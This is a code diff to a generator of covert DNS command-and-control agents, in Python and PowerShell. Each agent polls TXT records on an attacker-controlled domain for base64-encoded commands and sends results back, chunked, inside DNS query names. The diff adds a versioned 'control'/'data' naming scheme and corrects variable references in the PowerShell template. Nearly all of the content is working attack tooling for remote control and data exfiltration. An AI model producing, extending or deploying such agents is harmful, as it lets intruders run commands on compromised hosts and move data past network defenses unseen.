@@ -14,12 +14,17 @@ def build_python_dns_agent_script(
     poll_interval: float = 5.0,
     *,
     chunk_label_chars: int = 50,
+    dual_tier: bool = True,
 ) -> str:
     """Return a self-contained Python agent compatible with listeners/covert/dns.
 
-    Protocol:
-      poll   poll.<client_id>.<domain>  -> TXT base64(command) or "wait"
-      result result.<b64url_chunk>.<client_id>.<domain>  (urlsafe b64, no padding)
+    Protocol (dual_tier=True):
+      control  ks.v1.control.poll.<client_id>.<domain>  -> TXT base64(command) or "wait"
+      data     ks.v1.data.result.<b64url_chunk>.<client_id>.<domain>
+
+    Legacy (dual_tier=False):
+      poll   poll.<client_id>.<domain>
+      result result.<b64url_chunk>.<client_id>.<domain>
     """
     dom = str(domain or "c2.local").strip().rstrip(".")
     cid = str(client_id or "dns1").strip()
@@ -27,10 +32,11 @@ def build_python_dns_agent_script(
     port = int(dns_port or 53)
     interval = float(poll_interval or 5.0)
     chunk_sz = max(16, min(int(chunk_label_chars or 50), 62))
+    dual = bool(dual_tier)
 
     return f"""
 import base64,os,random,socket,struct,subprocess,time
-DOMAIN={dom!r}; CID={cid!r}; NS={srv!r}; PORT={int(port)}; INTERVAL={interval}; CHUNK={chunk_sz}
+DOMAIN={dom!r}; CID={cid!r}; NS={srv!r}; PORT={int(port)}; INTERVAL={interval}; CHUNK={chunk_sz}; DUAL={dual}
 
 def _enc_name(name):
   out=b''
@@ -115,7 +121,7 @@ def _b64url_nopad(raw):
   return base64.urlsafe_b64encode(raw).decode('ascii').rstrip('=')
 
 def _poll():
-  qname='poll.'+CID+'.'+DOMAIN
+  qname=('ks.v1.control.poll.'+CID+'.'+DOMAIN) if DUAL else ('poll.'+CID+'.'+DOMAIN)
   txts=_dns_query(qname, 16)
   if not txts: return ''
   txt=txts[0].strip()
@@ -130,7 +136,7 @@ def _send_result(text):
   enc=_b64url_nopad(raw)
   for i in range(0, len(enc) or 1, CHUNK):
     chunk=enc[i:i+CHUNK] or 'AA'
-    qname='result.'+chunk+'.'+CID+'.'+DOMAIN
+    qname=('ks.v1.data.result.'+chunk+'.'+CID+'.'+DOMAIN) if DUAL else ('result.'+chunk+'.'+CID+'.'+DOMAIN)
     try: _dns_query(qname, 16, timeout=6.0)
     except Exception: pass
 
@@ -154,6 +160,7 @@ def build_powershell_dns_agent_script(
     poll_interval: float = 5.0,
     *,
     chunk_label_chars: int = 50,
+    dual_tier: bool = True,
 ) -> str:
     """Return PowerShell source for a DNS TXT polling agent (listeners/covert/dns)."""
     dom = str(domain or "c2.local").strip().rstrip(".")
@@ -162,6 +169,7 @@ def build_powershell_dns_agent_script(
     port = int(dns_port or 53)
     interval = float(poll_interval or 5.0)
     chunk_sz = max(16, min(int(chunk_label_chars or 50), 62))
+    dual = bool(dual_tier)
 
     def esc(s: str) -> str:
         return str(s or "").replace("'", "''")
@@ -174,6 +182,7 @@ $NS='{esc(srv)}'
 $PORT=[int]{port}
 $INTERVAL=[double]{interval}
 $CHUNK=[int]{chunk_sz}
+$DUAL=$({'$true' if dual else '$false'})
 
 function Enc-Name([string]$name){{
   $bytes=New-Object Collections.Generic.List[byte]
@@ -275,7 +284,7 @@ function B64Url([byte[]]$raw){{
   return $s
 }}
 function Poll-Cmd(){{
-  $q='poll.'+$CID+'.'+DOMAIN
+  $q=if($DUAL){{ 'ks.v1.control.poll.'+$CID+'.'+$DOMAIN }} else {{ 'poll.'+$CID+'.'+$DOMAIN }}
   $txts=Dns-Query $q 16
   if(-not $txts -or $txts.Count -eq 0){{ return '' }}
   $txt=[string]$txts[0]
@@ -293,7 +302,7 @@ function Send-Result([string]$text){{
   for($i=0;$i -lt $enc.Length;$i+=$CHUNK){{
     $chunk=$enc.Substring($i,[Math]::Min($CHUNK,$enc.Length-$i))
     if(-not $chunk){{ $chunk='AA' }}
-    $q='result.'+$chunk+'.'+$CID+'.'+DOMAIN
+    $q=if($DUAL){{ 'ks.v1.data.result.'+$chunk+'.'+$CID+'.'+$DOMAIN }} else {{ 'result.'+$chunk+'.'+$CID+'.'+$DOMAIN }}
     try {{ [void](Dns-Query $q 16 6) }} catch {{}}
   }}
 }}
